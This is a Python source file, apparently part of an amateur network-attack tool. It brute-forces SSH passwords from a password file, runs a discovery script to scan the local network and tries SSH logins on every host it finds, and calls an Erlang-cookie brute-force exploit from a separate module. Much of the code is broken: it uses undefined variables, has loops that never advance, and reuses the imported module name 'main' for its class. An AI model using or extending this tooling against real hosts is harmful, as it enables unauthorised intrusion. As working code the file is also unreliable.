#!/bin/env python
import sys
import os
from sqlite3 import connect 
import netifaces
import paramiko
import subprocess
import listen as connect_listen
from sty import fg, bg, ef, rs
import threading
from sty import Style, RgbFg
import getopt
import logging
import json
import exploits
import main

netifaces.gateways()

class main(connect_listen.connect_listen):
    def __init__(self, hostname, port, username, password):
        super().__init__(hostname, port, username , password)
        self.networkfile = open("network.txt", "r+")
        self.passfile = open("pass.txt", "r+")



    def interface_get(self):
      print(str(addrs.keys()))
      print(str(netifaces.ifaddresses(str(interfaces[0]))))
      print(addrs[netifaces.AF_INET])
      print(addrs[netifaces.AF_LINK])


    def connect_normal(self):
     print(f'connecting to {self.hostname}')
     try:
      connect_listen.connect_listen.ssh_connect(self, pkey = None)
     except:
      print("error")

    def bruteforce(self):
     print("... bruteforcing")

     for password in self.passfile:
      try:
        connect_listen.connect_listen.ssh_connect(self, password, pkey = None)
        print(password)
      except:
        pass

    def testing_preferences(self):
      print("... requesting all preferences")
      my_line = self.myfile.readline()
      while my_line:
         connect_listen.connect_listen.preference(self, _pubkeys = self.myfile.readline(), _key = self.myfile.readline(), _compression = self.myfile.readline(), _kex = self.myfile.readline(), _macs = self.myfile.readline())


    def read_network(self):
     print("reading network") # add a try and except statement
     os.system("bash discover.sh")

     for host in self.networkfile:
      try:
       print(f'Connecting {host}')
       self.hostname = host
       connect_listen.connect_listen().ssh_connect(passwords = self.password, pkey = self.get_keyfile())
      except:
        print(f'Connection Failed {host}')
        pass


    def cookie_bruteforce(self):
     myline = self.myfile.readline()
     while myline:
      try:
       exploits.exploits().erlangcookie(self.network.readline())
      except:
          pass
